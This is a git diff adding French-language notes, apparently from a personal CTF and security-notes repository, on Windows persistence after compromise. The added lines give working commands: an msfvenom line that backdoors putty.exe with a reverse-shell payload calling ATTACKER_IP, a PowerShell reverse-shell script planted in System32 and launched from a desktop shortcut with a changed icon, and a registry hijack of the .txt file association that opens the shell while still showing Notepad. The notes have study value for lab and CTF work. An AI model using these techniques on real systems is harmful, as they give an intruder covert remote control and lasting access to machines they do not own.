@@ -72,3 +72,58 @@ On va cherché à lui donner la valeur de celui de l'administrateur à savoir RI
 ![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/bdeef6ac-10eb-479e-9173-98dbc9efaa4f)
 
 La prochaine fois que le user se connectera LSASS associera à celui-ci, le même RID que l'administrateur !
+
+<br>
+<br>
+
+## Executable Files
+
+Avec `evil-winrm` télécharger en local le fichier exécutable (exemple avec PuTTY)
+```
+download "C:\Program Files\PuTTY\putty.exe"
+```
+ensuite 
+```
+msfvenom -a x64 -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+```
+On réupload derrière
+```
+upload puttyX.exe
+```
+
+## Shortcut Files
+
+Script PowerShell pour reverse shell <a href="https://github.com/martinsohn/PowerShell-reverse-shell/tree/main">ici</a>.
+<br>
+<br>
+Créer un fichier `backdoor.ps1` par exemple ici : `C:\Windows\System32\backdoor.ps1`.
+<br>
+Faire propriété sur un raccourci du bureau et y coller dans `Target` :
+```
+Start-Process -NoNewWindow "C:\Windows\System32\backdoor.ps1 ATTACKER_IP 4445"
+
+C:\Windows\System32\<file>.exe
+```
+Penser aussi à changer l'icône !
+<br>
+<br>
+## Hijacking File Associations (exemple avec .txt)
+Ouvrir `regedit.exe`
+<br>
+Se rendre ici 
+```
+HKLM\Software\Classes\.txt
+```
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/d7767880-f541-4ca9-aeaa-9f197a1125b0)
+
+Ensuite 
+```
+HKLM\Software\Classes\txtfile\shell\open\command
+```
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/80ca377c-f582-4aa9-a851-cdd0b7e4b4ab)
+
+On créer une backdoor.ps1 quelque part dans l'arborescence, puis on modifie la valeur `Data`
+```
+Start-Process -NoNewWindow "c:\Windows\System32\backdoor.ps1 ATTACKER_IP 4448"
+C:\Windows\system32\NOTEPAD.EXE $args[0]
+```
